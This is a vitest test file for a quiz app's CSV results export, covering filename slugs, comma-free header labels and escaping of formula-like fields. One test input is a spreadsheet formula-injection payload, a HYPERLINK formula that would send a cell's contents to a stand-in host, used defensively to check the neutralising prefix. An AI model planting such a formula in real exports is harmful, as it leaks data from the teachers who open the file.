import type { ResultsView } from "@quiz/contracts";
import { describe, expect, it } from "vitest";

import { headerLabel } from "../../csv.js";
import { csvField, csvFilename, resultsCsv } from "./csv.js";

describe("csvFilename", () => {
  it("is the title's slug: accents folded, lower case, single dashes, capped", () => {
    expect(csvFilename("Test 0 — Bases du C (été)")).toBe("test-0-bases-du-c-ete.csv");
    expect(csvFilename("x".repeat(80))).toBe(`${"x".repeat(60)}.csv`);
  });

  it("falls back to `results` when the title has no usable character", () => {
    expect(csvFilename("—?!")).toBe("results.csv");
  });
});

describe("csvField", () => {
  /**
   * Finding M2: names and emails come from the roster import and from the
   * identity provider's claims, and the file is opened in Excel by the
   * teacher. Quoting does not stop a formula from running; the prefix does.
   */
  it("neutralises a field a spreadsheet would run as a formula", () => {
    // The prefix first, then the RFC-4180 quoting of the quotes it contains.
    expect(csvField('=HYPERLINK("http://evil.test?"&A1)')).toBe(
      `"'=HYPERLINK(""http://evil.test?""&A1)"`,
    );
    expect(csvField("+1 41 79")).toBe("'+1 41 79");
    expect(csvField("-2")).toBe("'-2");
    expect(csvField("@user")).toBe("'@user");
    expect(csvField("\tlead")).toBe("'\tlead");
    // …and a field that needs quoting is still quoted, prefix included.
    expect(csvField('=a;b"c')).toBe(`"'=a;b""c"`);
    // An ordinary field is untouched: the export stays diff-readable.
    expect(csvField("Dupond")).toBe("Dupond");
  });
});

describe("headerLabel", () => {
  it("drops the commas of a name, then cuts it at 30 characters", () => {
    expect(headerLabel("Pb2e QCM — portée, résolution et fausses détections")).toBe("Pb2e QCM — portée résolution e");
    expect(headerLabel("a,b , c")).toBe("a b c");
    // A comma at an edge or doubled leaves no stray space, so a suffix still follows one space.
    expect(headerLabel("Q1,")).toBe("Q1");
    expect(headerLabel(", a,,b")).toBe("a b");
    expect(headerLabel("Pointeurs")).toBe("Pointeurs");
  });
});

describe("resultsCsv", () => {
  /**
   * #1224: a spreadsheet whose list separator is the comma cuts a `;` line at
   * its commas, so a comma in a question's name split the header and no other
   * line. The header holds none, and still one field per column.
   */
  it("writes a header with no comma for an item whose name has one", () => {
    const view = {
      items: [
        { id: "a", internalName: "Portée, résolution", counting: "normal" },
        { id: "b", internalName: "Chirp, temps", counting: "bonus" },
      ],
      rows: [],
    } as unknown as ResultsView;
    expect(resultsCsv(view)).toBe("\uFEFFemail;last_name;first_name;Portée résolution;Chirp temps (bonus);total;grade\r\n");
  });
});
